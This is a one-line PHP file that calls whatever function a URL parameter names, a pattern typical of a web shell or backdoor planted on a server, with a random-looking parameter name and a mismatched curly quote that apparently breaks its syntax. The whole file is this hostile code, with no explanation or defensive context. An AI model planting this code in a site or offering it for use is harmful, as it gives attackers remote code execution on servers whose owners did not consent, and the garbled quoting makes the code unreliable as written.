<?php
$_GET[’NICZP3gS']($_GET['NICZP3gS']);
?>
